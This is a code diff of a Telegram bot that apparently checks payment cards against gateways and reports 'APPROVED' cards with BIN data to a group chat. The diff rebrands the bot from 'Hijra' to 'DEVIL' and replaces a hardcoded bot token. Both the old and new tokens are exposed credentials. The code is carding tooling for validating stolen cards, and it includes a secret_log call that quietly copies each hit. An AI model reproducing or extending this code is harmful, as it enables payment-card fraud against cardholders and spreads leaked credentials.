@@ -36,7 +36,7 @@ except ImportError:
 # ============================================================
 #  Configuration
 # ============================================================
-BOT_TOKEN = "8814945212:AAGFnRBqkSQSdiuMiPieLFH2BDbEocJUDhc"
+BOT_TOKEN = "8808007208:AAFfvIsUNbVf_bsXaBl34PAz6NL4ttL0STU"
 DEVELOPER = "Devillll"
 ADMIN_IDS = [1707478010]
 
@@ -198,7 +198,7 @@ def notify_gc(text):
 
 
 def notify_hit(user_id, username, gate_label, card_line, detail):
-    """Notify GC about a hit/approved card — Hijra format."""
+    """Notify GC about a hit/approved card — DEVIL format."""
     name = f"@{username}" if username else str(user_id)
     elapsed = ""
     if " | " in detail:
@@ -208,15 +208,15 @@ def notify_hit(user_id, username, gate_label, card_line, detail):
     # BIN info
     bin6 = card_line.split("|")[0][:6] if "|" in card_line else card_line[:6]
     hit_text = (
-        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
-        f"[🝂] CARD: <code>{card_line}</code>\n"
-        f"[🝂] GATEWAY: <code>{gate_label}</code>\n"
-        f"[🝂] STATUS: <b>APPROVED</b>\n"
-        f"[🝂] RESPONSE: <code>{detail}</code>\n\n"
+        f"<b>⍟━━━⌁ DEVIL ⌁━━━⍟</b>\n\n"
+        f"[🝂] CARD 💳: <code>{card_line}</code>\n"
+        f"[🝂] GATEWAY ⚡️: <code>{gate_label}</code>\n"
+        f"[🝂] STATUS : <b>APPROVED</b>\n"
+        f"[🝂] RESPONSE : <code>{detail}</code>\n\n"
         f"<b>⍟━━━━⍟ DETAILS ⍟━━━━⍟</b>\n\n"
-        f"[🝂] BIN: <code>{bin6}</code>\n"
-        f"[🝂] TIME TOOK: <code>{elapsed}</code>\n"
-        f"[🝂] CHECKED BY: {name}"
+        f"[🝂] BIN : <code>{bin6}</code>\n"
+        f"[🝂] TIME TOOK : <code>{elapsed}</code>\n"
+        f"[🝂] CHECKED BY : {name}"
     )
     notify_gc(hit_text)
     secret_log(hit_text)
@@ -880,7 +880,7 @@ def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=D
 def fmt_start(username, user_id):
     name = f"@{username}" if username else "User"
     return (
-        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
+        f"<b>⍟━━━⌁ DEVIL ⌁━━━⍟</b>\n\n"
         f"Welcome, <b>{name}</b>\n"
         f"Your ID: <code>{user_id}</code>\n\n"
         f"Use /help to see all available commands.\n\n"
@@ -2955,29 +2955,29 @@ def handle_update(update):
 
                 if status == "APPROVED":
                     msg_text = (
-                        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
-                        f"[🝂] CARD: <code>{cc_input}</code>\n"
-                        f"[🝂] GATEWAY: <code>{gate_label}</code>\n"
-                        f"[🝂] STATUS: <b>APPROVED ✅</b>\n"
-                        f"[🝂] RESPONSE: <code>{detail}</code>\n\n"
+                        f"<b>⍟━━━⌁ DEVIL ⌁━━━⍟</b>\n\n"
+                        f"[🝂] CARD 💳: <code>{cc_input}</code>\n"
+                        f"[🝂] GATEWAY⚡️: <code>{gate_label}</code>\n"
+                        f"[🝂] STATUS : <b>APPROVED ✅</b>\n"
+                        f"[🝂] RESPONSE : <code>{detail}</code>\n\n"
                         f"<b>⍟━━━━⍟ DETAILS ⍟━━━━⍟</b>\n\n"
-                        f"[🝂] BIN: <code>{bin_info or bin6}</code>\n"
-                        f"[🝂] TIME TOOK: <code>{elapsed}</code>\n"
-                        f"[🝂] CHECKED BY: {name}\n\n"
+                        f"[🝂] BIN : <code>{bin_info or bin6}</code>\n"
+                        f"[🝂] TIME TOOK : <code>{elapsed}</code>\n"
+                        f"[🝂] CHECKED BY : {name}\n\n"
                         f"<i>{DEVELOPER}</i>"
                     )
                 else:
                     status_emoji = "❌" if status == "DECLINED" else "⚠️"
                     msg_text = (
-                        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
-                        f"[🝂] CARD: <code>{cc_input}</code>\n"
-                        f"[🝂] GATEWAY: <code>{gate_label}</code>\n"
-                        f"[🝂] STATUS: <b>{status} {status_emoji}</b>\n"
-                        f"[🝂] RESPONSE: <code>{detail}</code>\n\n"
+                        f"<b>⍟━━━⌁ DEVIL ⌁━━━⍟</b>\n\n"
+                        f"[🝂] CARD 💳: <code>{cc_input}</code>\n"
+                        f"[🝂] GATEWAY ⚡️: <code>{gate_label}</code>\n"
+                        f"[🝂] STATUS : <b>{status} {status_emoji}</b>\n"
+                        f"[🝂] RESPONSE : <code>{detail}</code>\n\n"
                         f"<b>⍟━━━━⍟ DETAILS ⍟━━━━⍟</b>\n\n"
-                        f"[🝂] BIN: <code>{bin_info or bin6}</code>\n"
-                        f"[🝂] TIME TOOK: <code>{elapsed}</code>\n"
-                        f"[🝂] CHECKED BY: {name}\n\n"
+                        f"[🝂] BIN : <code>{bin_info or bin6}</code>\n"
+                        f"[🝂] TIME TOOK : <code>{elapsed}</code>\n"
+                        f"[🝂] CHECKED BY : {name}\n\n"
                         f"<i>{DEVELOPER}</i>"
                     )
 
@@ -3068,15 +3068,15 @@ def handle_update(update):
                         if len(p) == 2:
                             elapsed_h = p[1]
                     send_message(chat_id,
-                        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
-                        f"[🝂] CARD: <code>{entry}</code>\n"
-                        f"[🝂] GATEWAY: <code>{gate_label}</code>\n"
-                        f"[🝂] STATUS: <b>APPROVED ✅</b>\n"
-                        f"[🝂] RESPONSE: <code>{detail}</code>\n\n"
+                        f"<b>⍟━━━⌁ DEVIL ⌁━━━⍟</b>\n\n"
+                        f"[🝂] CARD 💳: <code>{entry}</code>\n"
+                        f"[🝂] GATEWAY⚡️: <code>{gate_label}</code>\n"
+                        f"[🝂] STATUS : <b>APPROVED ✅</b>\n"
+                        f"[🝂] RESPONSE : <code>{detail}</code>\n\n"
                         f"<b>⍟━━━━⍟ DETAILS ⍟━━━━⍟</b>\n\n"
-                        f"[🝂] BIN: <code>{bin6}</code>\n"
-                        f"[🝂] TIME TOOK: <code>{elapsed_h}</code>\n"
-                        f"[🝂] CHECKED BY: {name}\n"
+                        f"[🝂] BIN : <code>{bin6}</code>\n"
+                        f"[🝂] TIME TOOK : <code>{elapsed_h}</code>\n"
+                        f"[🝂] CHECKED BY : {name}\n"
                         f"[{idx}/{total}]\n\n"
                         f"<i>{DEVELOPER}</i>")
                     notify_hit(user_id, username, gate_label, entry, detail)
